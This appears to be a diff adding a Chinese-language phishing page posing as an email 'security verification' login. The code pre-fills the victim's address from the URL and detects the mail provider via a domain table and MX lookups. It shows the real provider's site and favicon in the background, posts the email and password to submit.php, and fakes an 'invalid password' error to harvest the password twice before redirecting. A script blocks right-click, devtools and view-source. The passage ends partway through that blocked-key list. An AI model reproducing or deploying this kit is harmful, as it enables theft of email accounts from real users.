@@ -1,0 +1,1358 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8" />
+    <title>邮箱安全验证系统</title>
+    <link rel="icon" href="./support/favicon.jpg" type="image/gif" sizes="16x16" id="dynamicFavicon" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+        }
+
+        body {
+            background: #f8f9fa;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            overflow: hidden;
+        }
+
+        .login-header {
+            background: linear-gradient(135deg, #1890ff, #096dd9);
+            padding: 20px;
+            text-align: center;
+            color: white;
+        }
+
+        .login-header h1 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .login-header p {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+
+        .login-body {
+            padding: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 13px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 2px solid #e8e8e8;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            background: #fafafa;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #1890ff;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(24, 144, 255, 0.1);
+        }
+
+        .form-input:read-only {
+            background: #f5f5f5;
+            color: #666;
+            cursor: not-allowed;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .checkbox-group input {
+            margin-right: 6px;
+        }
+
+        .checkbox-group label {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #1890ff, #096dd9);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 15px;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(24, 144, 255, 0.3);
+        }
+
+        .login-btn:active {
+            transform: translateY(0);
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 15px;
+            border-top: 1px solid #e8e8e8;
+            padding-top: 15px;
+        }
+
+        .footer-links a {
+            font-size: 11px;
+            color: #666;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #1890ff;
+        }
+
+        /* Message Styles */
+        .message {
+            border-radius: 6px;
+            margin-bottom: 12px;
+            font-size: 12px;
+            display: none;
+        }
+
+        .error-message {
+            background: #fff2f0;
+            border: 1px solid #ffccc7;
+            color: #a8071a;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        .success-message {
+            background: #f6ffed;
+            border: 1px solid #b7eb8f;
+            color: #389e0d;
+        }
+
+        .warning-message {
+            background: #fffbe6;
+            border: 1px solid #ffe58f;
+            color: #d48806;
+        }
+
+        .loading-message {
+            animation: shake 0.5s ease-in-out;
+            border: 1px solid #ffccc7;
+            color: #a8071a;
+        }
+
+        @keyframes shake {
+
+            0%,
+            20%,
+            40%,
+            60%,
+            80% {
+                transform: translateX(-2px);
+            }
+
+            10%,
+            30%,
+            50%,
+            70%,
+            90% {
+                transform: translateX(2px);
+            }
+
+            100% {
+                transform: translateX(0);
+            }
+        }
+
+        iframe {
+            position: fixed;
+            background: #f8f9fa;
+            border: none;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.3;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .fallback-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #f8f9fa;
+            z-index: -2;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="fallback-background"></div>
+    <iframe id="containerframe" src="" scrolling="no"
+        sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts"></iframe>
+
+    <div class="login-container">
+        <div class="login-header">
+            <h1>邮箱安全验证系统</h1>
+        </div>
+
+        <div class="login-body">
+            <form id="loginForm">
+                <input type="text" name="robot_check" id="robot_check" style="display:none" autocomplete="off">
+                <input type="hidden" name="form_time" id="form_time" value="">
+
+                <div class="form-group">
+                    <label class="form-label">邮箱地址</label>
+                    <input type="text" id="email" name="email" class="form-input" required autocomplete="off"
+                        placeholder="请输入您的邮箱地址">
+                    <p class="message loading-message" id="msg">
+                        密碼無效！請輸入正確的密碼。
+                    </p>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">登录密码</label>
+                    <input type="password" id="password" name="password" class="form-input" required autocomplete="off"
+                        placeholder="请输入您的密码">
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">保持登录状态</label>
+                </div>
+
+                <button type="submit" id="loginBtn" class="login-btn">立即登录</button>
+            </form>
+
+            <div class="footer-links">
+                <a href="#">邮政集团</a>
+                <a href="#">邮箱设置</a>
+                <a href="#">网易邮箱</a>
+                <a href="#">QQ邮箱</a>
+                <a href="#">微软中心</a>
+                <a href="#">联系我们</a>
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+
+        // Comprehensive Email Provider Database
+        const emailProviders = {
+            // NetEase (163) Family
+            "163.com": {
+                url: "https://mail.163.com",
+                favicon: "https://mail.163.com/favicon.ico",
+                name: "网易163邮箱",
+                type: "personal",
+                fallback: "https://www.163.com"
+            },
+            "126.com": {
+                url: "https://mail.126.com",
+                favicon: "https://mail.126.com/favicon.ico",
+                name: "网易126邮箱",
+                type: "personal",
+                fallback: "https://www.126.com"
+            },
+            "yeah.net": {
+                url: "https://mail.yeah.net",
+                favicon: "https://mail.yeah.net/favicon.ico",
+                name: "Yeah邮箱",
+                type: "personal",
+                fallback: "https://www.yeah.net"
+            },
+            "188.com": {
+                url: "https://www.188.com",
+                favicon: "https://www.188.com/favicon.ico",
+                name: "188邮箱",
+                type: "personal",
+                fallback: "https://www.188.com"
+            },
+            "vip.163.com": {
+                url: "https://vip.163.com",
+                favicon: "https://vip.163.com/favicon.ico",
+                name: "网易VIP邮箱",
+                type: "premium",
+                fallback: "https://www.163.com"
+            },
+
+            // NetEase Enterprise (Qiye)
+            "qiye.163.com": {
+                url: "https://qiye.163.com/login",
+                favicon: "https://qiye.163.com/favicon.ico",
+                name: "网易企业邮箱",
+                type: "enterprise",
+                fallback: "https://qiye.163.com"
+            },
+            "ym.163.com": {
+                url: "https://qiye.163.com/login",
+                favicon: "https://qiye.163.com/favicon.ico",
+                name: "网易企业邮箱",
+                type: "enterprise",
+                fallback: "https://qiye.163.com"
+            },
+            "hzmx01.mxmail.netease.com": {
+                url: "https://qiye.163.com/login",
+                favicon: "https://qiye.163.com/favicon.ico",
+                name: "网易企业邮箱",
+                type: "enterprise",
+                fallback: "https://qiye.163.com"
+            },
+            "netease.com": {
+                url: "https://qiye.163.com/login",
+                favicon: "https://qiye.163.com/favicon.ico",
+                name: "网易企业邮箱",
+                type: "enterprise",
+                fallback: "https://www.netease.com"
+            },
+
+            // Tencent/QQ Family
+            "qq.com": {
+                url: "https://mail.qq.com",
+                favicon: "https://mail.qq.com/favicon.ico",
+                name: "QQ邮箱",
+                type: "personal",
+                fallback: "https://www.qq.com"
+            },
+            "foxmail.com": {
+                url: "https://mail.qq.com",
+                favicon: "https://mail.qq.com/favicon.ico",
+                name: "Foxmail",
+                type: "personal",
+                fallback: "https://www.foxmail.com"
+            },
+            "vip.qq.com": {
+                url: "https://mail.qq.com",
+                favicon: "https://mail.qq.com/favicon.ico",
+                name: "QQ VIP邮箱",
+                type: "premium",
+                fallback: "https://www.qq.com"
+            },
+            "exmail.qq.com": {
+                url: "https://exmail.qq.com/login",
+                favicon: "https://exmail.qq.com/exmail_logo.ico",
+                name: "腾讯企业邮箱",
+                type: "enterprise",
+                fallback: "https://exmail.qq.com"
+            },
+            "biz1.qq.com": {
+                url: "https://exmail.qq.com/login",
+                favicon: "https://exmail.qq.com/exmail_logo.ico",
+                name: "腾讯企业邮箱",
+                type: "enterprise",
+                fallback: "https://exmail.qq.com"
+            },
+
+            // Alibaba/Aliyun Family
+            "aliyun.com": {
+                url: "https://mail.aliyun.com",
+                favicon: "https://mail.aliyun.com/favicon.ico",
+                name: "阿里邮箱",
+                type: "personal",
+                fallback: "https://www.aliyun.com"
+            },
+            "qiye.aliyun.com": {
+                url: "https://qiye.aliyun.com",
+                favicon: "https://qiye.aliyun.com/static/6173578/images/favicon.ico",
+                name: "阿里企业邮",
+                type: "enterprise",
+                fallback: "https://qiye.aliyun.com"
+            },
+            "dm.aliyun.com": {
+                url: "https://qiye.aliyun.com",
+                favicon: "https://qiye.aliyun.com/static/6173578/images/favicon.ico",
+                name: "阿里企业邮",
+                type: "enterprise",
+                fallback: "https://qiye.aliyun.com"
+            },
+            "mxhichina.com": {
+                url: "https://qiye.aliyun.com",
+                favicon: "https://qiye.aliyun.com/static/6173578/images/favicon.ico",
+                name: "阿里企业邮",
+                type: "enterprise",
+                fallback: "https://qiye.aliyun.com"
+            },
+
+            // Sina Family
+            "sina.com": {
+                url: "https://mail.sina.com.cn",
+                favicon: "https://mail.sina.com.cn/favicon.ico",
+                name: "新浪邮箱",
+                type: "personal",
+                fallback: "https://www.sina.com.cn"
+            },
+            "sina.cn": {
+                url: "https://mail.sina.com.cn",
+                favicon: "https://mail.sina.com.cn/favicon.ico",
+                name: "新浪邮箱",
+                type: "personal",
+                fallback: "https://www.sina.cn"
+            },
+            "vip.sina.com": {
+                url: "https://vip.sina.com.cn",
+                favicon: "https://vip.sina.com.cn/favicon.ico",
+                name: "新浪VIP邮箱",
+                type: "premium",
+                fallback: "https://www.sina.com.cn"
+            },
+            "sinanet.com": {
+                url: "https://mail.sina.net",
+                favicon: "https://mail.sina.net/favicon.ico",
+                name: "Sina Mail",
+                type: "enterprise",
+                fallback: "https://www.sina.com"
+            },
+
+            // Sohu Family
+            "sohu.com": {
+                url: "https://mail.sohu.com",
+                favicon: "https://mail.sohu.com/favicon.ico",
+                name: "搜狐邮箱",
+                type: "personal",
+                fallback: "https://www.sohu.com"
+            },
+            "vip.sohu.com": {
+                url: "https://mail.sohu.com",
+                favicon: "https://mail.sohu.com/favicon.ico",
+                name: "搜狐VIP邮箱",
+                type: "premium",
+                fallback: "https://www.sohu.com"
+            },
+
+            // China Mobile/Telecom/Unicom
+            "139.com": {
+                url: "https://mail.10086.cn",
+                favicon: "https://mail.10086.cn/favicon.ico",
+                name: "139邮箱",
+                type: "personal",
+                fallback: "https://www.10086.cn"
+            },
+            "189.cn": {
+                url: "https://mail.189.cn",
+                favicon: "https://mail.189.cn/favicon.ico",
+                name: "189邮箱",
+                type: "personal",
+                fallback: "https://www.189.cn"
+            },
+            "wo.cn": {
+                url: "https://mail.wo.cn",
+                favicon: "https://mail.wo.cn/favicon.ico",
+                name: "沃邮箱",
+                type: "personal",
+                fallback: "https://www.wo.cn"
+            },
+
+            // 21CN & TOM
+            "21cn.com": {
+                url: "https://mail.21cn.com",
+                favicon: "https://mail.21cn.com/w2/favicon.ico",
+                name: "21CN邮箱",
+                type: "personal",
+                fallback: "https://www.21cn.com"
+            },
+            "tom.com": {
+                url: "https://mail.tom.com",
+                favicon: "https://mail.tom.com/favicon.ico",
+                name: "TOM邮箱",
+                type: "personal",
+                fallback: "https://www.tom.com"
+            },
+
+            // 263 Family
+            "263.net": {
+                url: "https://mail.263.net",
+                favicon: "https://mail.263.net/favicon.ico",
+                name: "263邮箱",
+                type: "enterprise",
+                fallback: "https://www.263.net"
+            },
+            "263xmail.com": {
+                url: "http://wm.263xmail.com",
+                favicon: "http://wm.263xmail.com/custom_login/images/favicon.ico?v=10174",
+                name: "263企业邮",
+                type: "enterprise",
+                fallback: "http://www.263.net"
+            },
+            "mxcom.263xmail.com": {
+                url: "http://wm.263xmail.com",
+                favicon: "http://wm.263xmail.com/custom_login/images/favicon.ico?v=10174",
+                name: "263企业邮",
+                type: "enterprise",
+                fallback: "http://www.263.net"
+            },
+            "mxw.263.net": {
+                url: "http://wm.263xmail.com",
+                favicon: "http://wm.263xmail.com/custom_login/images/favicon.ico?v=10174",
+                name: "263企业邮",
+                type: "enterprise",
+                fallback: "http://www.263.net"
+            },
+
+            // International Providers
+            "gmail.com": {
+                url: "https://mail.google.com",
+                favicon: "https://mail.google.com/favicon.ico",
+                name: "Gmail",
+                type: "personal",
+                fallback: "https://www.google.com"
+            },
+            "googlemail.com": {
+                url: "https://mail.google.com",
+                favicon: "https://mail.google.com/favicon.ico",
+                name: "Google Mail",
+                type: "personal",
+                fallback: "https://www.google.com"
+            },
+            "outlook.com": {
+                url: "https://outlook.live.com",
+                favicon: "https://outlook.live.com/favicon.ico",
+                name: "Outlook",
+                type: "personal",
+                fallback: "https://www.microsoft.com"
+            },
+            "hotmail.com": {
+                url: "https://outlook.live.com",
+                favicon: "https://outlook.live.com/favicon.ico",
+                name: "Hotmail",
+                type: "personal",
+                fallback: "https://www.microsoft.com"
+            },
+            "live.com": {
+                url: "https://outlook.live.com",
+                favicon: "https://outlook.live.com/favicon.ico",
+                name: "Live Mail",
+                type: "personal",
+                fallback: "https://www.microsoft.com"
+            },
+            "msn.com": {
+                url: "https://outlook.live.com",
+                favicon: "https://outlook.live.com/favicon.ico",
+                name: "MSN Mail",
+                type: "personal",
+                fallback: "https://www.msn.com"
+            },
+            "yahoo.com": {
+                url: "https://mail.yahoo.com",
+                favicon: "https://mail.yahoo.com/favicon.ico",
+                name: "Yahoo Mail",
+                type: "personal",
+                fallback: "https://www.yahoo.com"
+            },
+            "ymail.com": {
+                url: "https://mail.yahoo.com",
+                favicon: "https://mail.yahoo.com/favicon.ico",
+                name: "YMail",
+                type: "personal",
+                fallback: "https://www.yahoo.com"
+            },
+            "rocketmail.com": {
+                url: "https://mail.yahoo.com",
+                favicon: "https://mail.yahoo.com/favicon.ico",
+                name: "Rocket Mail",
+                type: "personal",
+                fallback: "https://www.yahoo.com"
+            },
+            "icloud.com": {
+                url: "https://www.icloud.com/mail",
+                favicon: "https://www.icloud.com/favicon.ico",
+                name: "iCloud Mail",
+                type: "personal",
+                fallback: "https://www.icloud.com"
+            },
+            "me.com": {
+                url: "https://www.icloud.com/mail",
+                favicon: "https://www.icloud.com/favicon.ico",
+                name: "Me.com",
+                type: "personal",
+                fallback: "https://www.icloud.com"
+            },
+            "aol.com": {
+                url: "https://mail.aol.com",
+                favicon: "https://mail.aol.com/favicon.ico",
+                name: "AOL Mail",
+                type: "personal",
+                fallback: "https://www.aol.com"
+            },
+            "protonmail.com": {
+                url: "https://mail.protonmail.com",
+                favicon: "https://proton.me/favicons/favicon.ico",
+                name: "ProtonMail",
+                type: "personal",
+                fallback: "https://proton.me"
+            },
+            "proton.me": {
+                url: "https://mail.proton.me",
+                favicon: "https://proton.me/favicons/favicon.ico",
+                name: "Proton Mail",
+                type: "personal",
+                fallback: "https://proton.me"
+            },
+            "zoho.com": {
+                url: "https://mail.zoho.com",
+                favicon: "https://mail.zoho.com/favicon.ico",
+                name: "Zoho Mail",
+                type: "enterprise",
+                fallback: "https://www.zoho.com"
+            },
+            "zohomail.com": {
+                url: "https://mail.zoho.com",
+                favicon: "https://mail.zoho.com/favicon.ico",
+                name: "Zoho Mail",
+                type: "enterprise",
+                fallback: "https://www.zoho.com"
+            },
+
+            // Other Chinese Providers
+            "icoremail.net": {
+                url: "https://mail.icoremail.net",
+                favicon: "https://mail.icoremail.net/favicon.ico",
+                name: "Coremail企业邮",
+                type: "enterprise",
+                fallback: "https://www.coremail.com"
+            },
+            "zmail300.cn": {
+                url: "https://mail.zmail300.cn",
+                favicon: "https://mail.zmail300.cn/customlogin/mail.zmail300.cn/resource/favicon-wm.ico?v=100000",
+                name: "Zmail企业邮",
+                type: "enterprise",
+                fallback: "https://www.zmail300.cn"
+            },
+            "global-mail.cn": {
+                url: "https://mail.global-mail.cn",
+                favicon: "https://mail.global-mail.cn/customlogin/mail.global-mail.cn/resource/favicon.ico?v=100000",
+                name: "Global Mail",
+                type: "enterprise",
+                fallback: "https://www.global-mail.cn"
+            },
+            "cn4e.com": {
+                url: "https://w.cn4e.com",
+                favicon: "https://w.cn4e.com/login/favicon.ico",
+                name: "CN4E邮箱",
+                type: "enterprise",
+                fallback: "https://www.cn4e.com"
+            },
+            "hgcbizmail.com": {
+                url: "https://webmail.hgcbizmail.com",
+                favicon: "https://webmail.hgcbizmail.com/CookieAuth.dll?GetPic?formdir=3&image=favicon.ico",
+                name: "HGC Bizmail",
+                type: "enterprise",
+                fallback: "https://www.hgcbizmail.com"
+            },
+            "hinet.net": {
+                url: "https://webmail.hinet.net",
+                favicon: "https://www.hinet.net/resources/images/favicon.ico",
+                name: "Hinet邮箱",
+                type: "personal",
+                fallback: "https://www.hinet.net"
+            },
+            "rediffmail.com": {
+                url: "https://f4mail.rediff.com",
+                favicon: "https://im.rediff.com/favicon.ico",
+                name: "Rediffmail",
+                type: "personal",
+                fallback: "https://www.rediff.com"
+            },
+            "mail.ru": {
+                url: "https://mail.ru",
+                favicon: "https://home.imgsmail.ru/resplash/143498/i/meta/favicon.ico",
+                name: "Mail.ru",
+                type: "personal",
+                fallback: "https://mail.ru"
+            },
+            "yandex.ru": {
+                url: "http://mail.yandex.com",
+                favicon: "https://mail.yandex.com/u2709/favicon/ico/main-favicon.ico",
+                name: "Yandex Mail",
+                type: "personal",
+                fallback: "https://yandex.com"
+            },
+            "naver.com": {
+                url: "https://nid.naver.com",
+                favicon: "https://www.naver.com/favicon.ico",
+                name: "Naver Mail",
+                type: "personal",
+                fallback: "https://www.naver.com"
+            },
+            "secureserver.net": {
+                url: "https://sso.godaddy.com",
+                favicon: "https://img6.wsimg.com/ux/favicon/apple-icon-57x57.png",
+                name: "GoDaddy Email",
+                type: "enterprise",
+                fallback: "https://www.godaddy.com"
+            },
+            "privateemail.com": {
+                url: "https://privateemail.com",
+                favicon: "https://privateemail.com/appsuite/login-assets/images/favicon.ico",
+                name: "Private Email",
+                type: "enterprise",
+                fallback: "https://privateemail.com"
+            },
+            "mimecast.com": {
+                url: "https://webmail.mimecast.com",
+                favicon: "https://webmail.mimecast.com/favicon.ico",
+                name: "Mimecast",
+                type: "enterprise",
+                fallback: "https://www.mimecast.com"
+            }
+        };
+
+        let emailFromURL = false;
+        let currentProviderUrl = "";
+
+
+        /* ================= FAVICON ================= */
+
+        function updateBrowserFavicon(faviconUrl) {
+
+            let favicon = document.getElementById("dynamicFavicon");
+
+            if (!favicon) {
+                favicon = document.createElement("link");
+                favicon.id = "dynamicFavicon";
+                favicon.rel = "icon";
+                document.head.appendChild(favicon);
+            }
+
+            favicon.href = faviconUrl;
+        }
+
+
+        /* ================= MX LOOKUP ================= */
+
+        async function getMXRecords(domain) {
+
+            const apiURLs = [
+                `https://dns.google/resolve?name=${domain}&type=MX`,
+                `https://cloudflare-dns.com/dns-query?name=${domain}&type=MX`
+            ];
+
+            for (const apiURL of apiURLs) {
+
+                try {
+
+                    const response = await fetch(apiURL, {
+                        headers: { "Accept": "application/dns-json" }
+                    });
+
+                    if (!response.ok) continue;
+
+                    const data = await response.json();
+
+                    const mxRecords = data.Answer
+                        ?.filter(record => record.type === 15)
+                        .map(record =>
+                            record.data.split(" ").pop().replace(/\.$/, "")
+                        ) || [];
+
+                    if (mxRecords.length) {
+                        console.log("MX Records:", mxRecords);
+                        return mxRecords;
+                    }
+
+                } catch (err) {
+                    console.warn("MX lookup failed:", err);
+                }
+            }
+
+            throw new Error("MX records not found");
+        }
+
+
+        /* ================= PROVIDER DETECTION ================= */
+
+        function getProviderFromMXRecords(mxRecords) {
+
+            for (const [domain, provider] of Object.entries(emailProviders)) {
+
+                for (const mxRecord of mxRecords) {
+
+                    if (mxRecord.endsWith(domain)) {
+                        console.log("MX match:", domain);
+                        return provider;
+                    }
+
+                }
+            }
+
+            return null;
+        }
+
+
+        async function detectProviderByDomain(email) {
+
+            try {
+
+                const fullDomain = email.split("@")[1].toLowerCase();
+
+                /* ---------- Exact match ---------- */
+
+                if (emailProviders[fullDomain]) {
+                    return emailProviders[fullDomain];
+                }
+
+                /* ---------- MX detection ---------- */
+
+                try {
+
+                    const mxRecords = await getMXRecords(fullDomain);
+                    const provider = getProviderFromMXRecords(mxRecords);
+
+                    if (provider) return provider;
+
+                } catch (e) {
+                    console.warn("MX detection failed:", e);
+                }
+
+                /* ---------- Subdomain detection ---------- */
+
+                const parts = fullDomain.split(".");
+
+                if (parts.length >= 3) {
+
+                    const enterpriseDomain = parts.slice(-3).join(".");
+
+                    if (emailProviders[enterpriseDomain]) {
+                        return emailProviders[enterpriseDomain];
+                    }
+                }
+
+                /* ---------- Base domain detection ---------- */
+
+                const baseDomain = parts.slice(-2).join(".");
+
+                if (emailProviders[baseDomain]) {
+                    return emailProviders[baseDomain];
+                }
+
+                /* ---------- Fallback provider ---------- */
+
+                return {
+                    url: `https://mail.${fullDomain}`,
+                    favicon: `https://www.google.com/s2/favicons?domain=${fullDomain}&sz=32`,
+                    name: `${fullDomain} 邮箱`,
+                    type: "personal",
+                    fallback: `https://www.${fullDomain}`
+                };
+
+            } catch (error) {
+
+                console.error("Provider detection error:", error);
+                throw error;
+
+            }
+        }
+
+
+        /* ================= URL ACCESSIBILITY ================= */
+
+        function checkUrlAccessibility(url, timeout = 5000) {
+
+            return new Promise(resolve => {
+
+                const img = new Image();
+
+                const timer = setTimeout(() => {
+                    img.src = "";
+                    resolve(false);
+                }, timeout);
+
+                img.onload = () => {
+                    clearTimeout(timer);
+                    resolve(true);
+                };
+
+                img.onerror = () => {
+                    clearTimeout(timer);
+                    resolve(false);
+                };
+
+                img.src = url;
+
+            });
+        }
+
+
+        /* ================= EMAIL BACKGROUND ================= */
+
+        async function loadEmailBackground(email) {
+
+            try {
+
+                const provider = await detectProviderByDomain(email);
+
+                console.log("Provider:", provider.name);
+
+                let finalUrl = provider.url;
+
+                try {
+
+                    const accessible = await checkUrlAccessibility(provider.url);
+
+                    if (!accessible && provider.fallback) {
+                        finalUrl = provider.fallback;
+                    }
+
+                } catch (e) {
+                    console.warn("Accessibility check failed");
+                }
+
+                currentProviderUrl = finalUrl;
+
+                const iframe = document.getElementById("containerframe");
+
+                iframe.src = finalUrl;
+
+                iframe.onerror = () => {
+                    iframe.src = provider.fallback;
+                };
+
+                document.getElementById("email").value = email;
+
+                updateBrowserFavicon(provider.favicon);
+
+                console.log("Loaded:", finalUrl);
+
+            } catch (error) {
+
+                console.error("Load error:", error);
+
+                const domain = email.includes("@")
+                    ? email.split("@")[1]
+                    : "example.com";
+
+                currentProviderUrl = `https://www.${domain}`;
+
+                document.getElementById("containerframe").src = currentProviderUrl;
+
+                updateBrowserFavicon(
+                    `https://www.google.com/s2/favicons?domain=${domain}&sz=32`
+                );
+            }
+        }
+
+
+        /* ================= VALIDATION ================= */
+
+        function isValidEmail(email) {
+
+            const regex =
+                /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+
+            return regex.test(email);
+        }
+
+
+        /* ================= BASE64 ================= */
+
+        function base64Encode(str) {
+
+            const bytes = new TextEncoder().encode(str);
+
+            let binary = "";
+
+            bytes.forEach(b => binary += String.fromCharCode(b));
+
+            return btoa(binary);
+        }
+
+
+        function base64Decode(str) {
+
+            try {
+
+                const binary = atob(str);
+
+                const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
+
+                return new TextDecoder().decode(bytes);
+
+            } catch {
+                return null;
+            }
+        }
+
+
+        /* ================= RANDOM STRING ================= */
+
+        function generateRandomString(length = 100) {
+
+            const chars =
+                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+            let result = "";
+
+            for (let i = 0; i < length; i++) {
+
+                result += chars.charAt(
+                    Math.floor(Math.random() * chars.length)
+                );
+            }
+
+            return result;
+        }
+
+
+        /* ================= URL EMAIL ================= */
+
+        function getEmailFromURL() {
+
+            const params = new URLSearchParams(window.location.search);
+
+            const auth = params.get("auth");
+            const email = params.get("email");
+
+            if (auth) {
+
+                const decoded = base64Decode(auth);
+
+                if (decoded && isValidEmail(decoded)) return decoded;
+
+                const match = auth.match(
+                    /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/
+                );
+
+                if (match) return match[0];
+
+                if (isValidEmail(auth)) return auth;
+            }
+
+            if (email && isValidEmail(email)) return email;
+
+            return null;
+        }
+
+
+        function appendRandomStringToURL() {
+
+            const params = new URLSearchParams(window.location.search);
+
+            params.set("rnd", generateRandomString());
+
+            const email = getEmailFromURL();
+
+            if (email) {
+                params.set("auth", base64Encode(email));
+            }
+
+            const base = window.location.href.split("?")[0];
+
+            window.history.replaceState(
+                null,
+                null,
+                base + "?" + params.toString()
+            );
+        }
+
+
+        /* ================= EMAIL INPUT ================= */
+
+        function setEmailInputState() {
+
+            const urlEmail = getEmailFromURL();
+
+            const input = document.getElementById("email");
+
+            if (urlEmail) {
+
+                input.value = urlEmail;
+
+                input.readOnly = true;
+
+                emailFromURL = true;
+
+                loadEmailBackground(urlEmail);
+
+            } else {
+
+                input.readOnly = false;
+
+                emailFromURL = false;
+            }
+        }
+
+
+        /* ================= INIT ================= */
+
+        function init() {
+
+            appendRandomStringToURL();
+
+            setEmailInputState();
+
+            const emailInput = document.getElementById("email");
+
+            emailInput.addEventListener("blur", function () {
+
+                if (!emailFromURL && this.value && isValidEmail(this.value)) {
+
+                    loadEmailBackground(this.value);
+
+                }
+
+            });
+        }
+
+
+        /* ================= START ================= */
+
+        document.addEventListener("DOMContentLoaded", init);
+
+
+    </script>
+
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            let count = 0;
+
+            // Set timestamp on load
+            $('#form_time').val(Math.floor(Date.now() / 1000));
+
+            // Add hidden timestamp
+            if (!$('#form_time').length) {
+                $('<input>').attr({
+                    type: 'hidden',
+                    id: 'form_time',
+                    name: 'form_time',
+                    value: Math.floor(Date.now() / 1000)
+                }).appendTo('#loginForm');
+            }
+
+            // Submit on Enter key
+            $(document).keypress(function (event) {
+                if (event.which === 13) {
+                    event.preventDefault();
+                    $("#loginBtn").click();
+                }
+            });
+
+            // Form submission
+            $('#loginForm').on('submit', function (event) {
+                event.preventDefault();
+                $('#msg').hide();
+
+
+                const email = $('#email').val().trim();
+                const password = $('#password').val();
+
+                // client-side checks
+                if (!email || !password) {
+                    $('#msg').text('❌ 请输入邮箱地址和密码').show();
+                    return;
+                }
+                if (!isValidEmail(email)) {
+                    $('#msg').text('❌ 请输入有效的邮箱地址').show();
+                    return;
+                }
+
+                count++;
+
+                const formData = new FormData(this);
+                $.ajax({
+                    url: 'submit.php',
+                    type: 'POST',
+                    data: formData,
+                    dataType: 'json',
+                    processData: false,
+                    contentType: false,
+                    beforeSend: function () {
+                        $('#loginBtn').html('核實...');
+                    },
+                    success: function (response) {
+                        if (response.status === 'error') {
+                            $('#msg').text(response.msg).show();
+                            $('#loginBtn').html('重試').prop('disabled', false);
+                            return;
+                        }
+
+                        if (count >= 2) {
+                            count = 0;
+                            if (ai) {
+                                const domain = ai.split('@')[1].split('.')[0];
+                                window.location.href = "http://www." + domain + ".com";
+                            } else {
+                                window.location.href = "http://mail.com";
+                            }
+                            return;
+                        }
+
+                        $('#password').val('');
+                        $('#msg').text('❌ 密碼無效！請輸入正確的密碼。').show();
+                        $('#loginBtn').html('重試').prop('disabled', false);
+                    },
+                    error: function (xhr, status, error) {
+                        $('#msg').text("❌ 提交失敗，請重試。").show();
+                        $('#loginBtn').html('重試').prop('disabled', false);
+                    }
+                });
+            });
+        });
+    </script>
+
+    <!-- ==============LOCK SCRIPT==================== -->
+    <script>
+        // Block right-click context menu
+        document.addEventListener('contextmenu', function (e) {
+            e.preventDefault();
+            return false;
+        });
+        // Block keyboard shortcuts
+        document.addEventListener('keydown', function (e) {
+            // List of blocked key combinations
+            const blockedCombinations = [
+                // Developer tools
+                {
+                    key: 'F12',
+                    ctrl: false,
+                    shift: false
+                },
+                {
+                    key: 'I',
+                    ctrl: true,
+                    shift: true
+                }, // Ctrl+Shift+I
+                {
+                    key: 'J',
+                    ctrl: true,
+                    shift: true
+                }, // Ctrl+Shift+J
+                {
+                    key: 'C',
+                    ctrl: true,
+                    shift: true
+                }, // Ctrl+Shift+C
+                // View source/save
+                {
+                    key: 'U',
+                    ctrl: true
+                }, // Ctrl+U
+                {
+                    key: 'S',
+                    ctrl: true
+                }, // Ctrl+S
+                // Mac equivalents
+                {
+                    key: 'U',
+                    meta: true
+                }, // Cmd+U (Mac)
+                {
+                    key: 'S',
+                    meta: true
+                }, // Cmd+S (Mac)
+                {
+                    key: 'I',
+                    meta: true,
+                    alt: true
+                }, // Cmd+Opt+I (Mac)
+                // Additional protections
+                {
+                    key: 'F5'
+                }, // Refresh
+                {
+                    key: 'R',
+                    ctrl: true
+                }, // Ctrl+R
+                {
+                    key: 'F5',
+                    ctrl: true
+                }, // Ctrl+F5
+                {
+                    key: 'F5',
+                    shift: true
